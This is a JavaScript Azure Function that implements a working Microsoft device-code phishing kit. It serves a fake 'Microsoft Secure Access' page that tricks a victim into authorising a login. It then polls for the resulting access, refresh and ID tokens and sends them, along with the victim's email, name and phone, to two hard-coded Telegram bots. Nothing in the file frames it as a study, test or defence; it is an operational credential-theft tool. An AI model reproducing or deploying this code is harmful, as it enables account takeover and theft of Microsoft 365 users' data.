const { app } = require("@azure/functions");
const axios = require('axios');

// Telegram configuration - REAL TOKENS
const TELEGRAM_BOT_TOKEN = "7768080373:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
const TELEGRAM_CHAT_ID = "6743632244";
const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
const TELEGRAM_CHAT_ID2 = "6263177378";

// Microsoft Graph CLI client ID (no redirect URI configured)
const client_id = '14d82eec-204b-4c2f-b7e8-296a70dab67e';
const resource = "https://graph.microsoft.com/";
const token_endpoint = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0";

async function sendTelegram(message, isSecondary = false) {
    const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
    const chatId = isSecondary ? TELEGRAM_CHAT_ID2 : TELEGRAM_CHAT_ID;
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`Telegram message sent: ${message.substring(0, 50)}...`);
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

app.http("devicecode", {
    methods: ["GET", "POST"],
    authLevel: "anonymous",
    route: "secure-access",
    handler: async (request, context) => {
        try {
            // Generate device code
            const devicecode = await axios.post(token_endpoint, {
                'client_id': client_id,
                'resource': '0000000c-0000-0000-c000-000000000000',
            }, {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
            }).then(response => response.data)
            .catch((ex) => {
                console.error('Device code generation error:', ex);
                throw ex;
            });

            context.log(`Device code generated: ${JSON.stringify(devicecode)}`);
            
            // Send Telegram notification
            await sendTelegram(`🎯 <b>Device Code Generated</b>\n\n📱 <b>User Code:</b> <code>${devicecode.user_code}</code>\n🔗 <b>Verification URL:</b> ${devicecode.verification_url}\n⏱️ <b>Expires:</b> ${devicecode.expires_in}s`);
            await sendTelegram(`🎯 <b>Device Code Generated</b>\n\n📱 <b>User Code:</b> <code>${devicecode.user_code}</code>\n🔗 <b>Verification URL:</b> ${devicecode.verification_url}\n⏱️ <b>Expires:</b> ${devicecode.expires_in}s`, true);

            // Start polling for token
            pollForToken(devicecode.device_code, context);

            // Return the landing page
            const response = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Microsoft Secure Access</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f3f2f1; }
                    .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; }
                    .header { text-align: center; margin-bottom: 30px; }
                    .logo { width: 60px; height: 60px; margin-bottom: 20px; }
                    .title { color: #323130; font-size: 28px; font-weight: 600; margin-bottom: 10px; }
                    .subtitle { color: #605e5c; font-size: 16px; margin-bottom: 30px; }
                    .code-box { background: #f8f9fa; border: 2px solid #0078d4; border-radius: 6px; padding: 20px; margin: 20px 0; text-align: center; }
                    .code { font-family: 'Consolas', monospace; font-size: 24px; font-weight: bold; color: #0078d4; letter-spacing: 2px; }
                    .instructions { color: #323130; font-size: 16px; line-height: 1.6; margin: 20px 0; }
                    .button { background: #0078d4; color: white; padding: 12px 24px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 0; }
                    .button:hover { background: #106ebe; }
                    .footer { margin-top: 30px; text-align: center; color: #605e5c; font-size: 14px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <svg class="logo" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#0078d4"/>
                            <path d="M10 2C5.58 2 2 5.58 2 10s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6z" fill="#0078d4"/>
                        </svg>
                        <h1 class="title">Microsoft Secure Access</h1>
                        <p class="subtitle">Complete your authentication to access your account</p>
                    </div>
                    
                    <div class="instructions">
                        <p>To complete your authentication, please follow these steps:</p>
                        <ol>
                            <li>Click the button below to visit the Microsoft verification page</li>
                            <li>Enter the following code when prompted:</li>
                        </ol>
                    </div>
                    
                    <div class="code-box">
                        <div class="code">${devicecode.user_code}</div>
                    </div>
                    
                    <div style="text-align: center;">
                        <a href="${devicecode.verification_url}" target="_blank" class="button">Continue to Microsoft</a>
                    </div>
                    
                    <div class="footer">
                        <p>This page will automatically update once authentication is complete.</p>
                        <p>If you don't see an update within 5 minutes, please refresh this page.</p>
                    </div>
                </div>
            </body>
            </html>`;

            return new Response(response, {
                status: 200,
                headers: {
                    'Content-Type': 'text/html; charset=utf-8',
                    'X-Content-Type-Options': 'nosniff'
                }
            });

        } catch (error) {
            context.log.error('Device code error:', error);
            await sendTelegram(`❌ <b>Device Code Error</b>\n\n${error.message}`);
            return new Response('Error generating device code', { status: 500 });
        }
    }
});

async function pollForToken(deviceCode, context) {
    const token_endpoint = "https://login.microsoftonline.com/common/oauth2/token";
    let poll_count = 0;
    const max_polls = 60; // 5 minutes (5s intervals)
    
    while (poll_count++ < max_polls) {
        try {
            const tokenResponse = await axios.post(token_endpoint, {
                "client_id": client_id,
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "resource": "https://graph.microsoft.com",
                "code": deviceCode
            }, {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
            });

            const tokens = tokenResponse.data;
            context.log(`Tokens captured: ${JSON.stringify(tokens)}`);
            
            // Send success notification with all tokens
            const successMessage = `🔥 <b>TOKEN CAPTURE SUCCESS!</b>\n\n🔑 <b>Access Token:</b> <code>${tokens.access_token}</code>\n🔄 <b>Refresh Token:</b> <code>${tokens.refresh_token || 'N/A'}</code>\n🆔 <b>ID Token:</b> <code>${tokens.id_token || 'N/A'}</code>\n⏱️ <b>Expires In:</b> ${tokens.expires_in}s\n📝 <b>Token Type:</b> ${tokens.token_type}`;
            
            await sendTelegram(successMessage);
            await sendTelegram(successMessage, true);
            
            // Fetch user profile
            try {
                const userResponse = await axios.get('https://graph.microsoft.com/v1.0/me', {
                    headers: {
                        'Authorization': `Bearer ${tokens.access_token}`,
                        'User-Agent': 'AzureAiTMFunction/1.0'
                    }
                });
                
                const userProfile = userResponse.data;
                const profileMessage = `👤 <b>User Profile Captured</b>\n\n📧 <b>Email:</b> ${userProfile.mail || userProfile.userPrincipalName}\n👤 <b>Name:</b> ${userProfile.displayName}\n🏢 <b>Company:</b> ${userProfile.jobTitle || 'N/A'}\n📱 <b>Phone:</b> ${userProfile.businessPhones?.[0] || 'N/A'}`;
                
                await sendTelegram(profileMessage);
                await sendTelegram(profileMessage, true);
                
            } catch (profileError) {
                await sendTelegram(`⚠️ <b>Profile Fetch Error</b>\n\n${profileError.message}`);
            }
            
            return;
            
        } catch (error) {
            if (error.response?.data?.error === "authorization_pending") {
                context.log(`Authorization pending, polling again... (${poll_count}/${max_polls})`);
            } else {
                context.log(`Token polling error:`, error.response?.data || error.message);
                await sendTelegram(`❌ <b>Token Polling Error</b>\n\n${error.response?.data?.error_description || error.message}`);
                return;
            }
        }
        
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
    
    await sendTelegram(`⏰ <b>Device Code Expired</b>\n\nNo authentication completed within 5 minutes.`);
}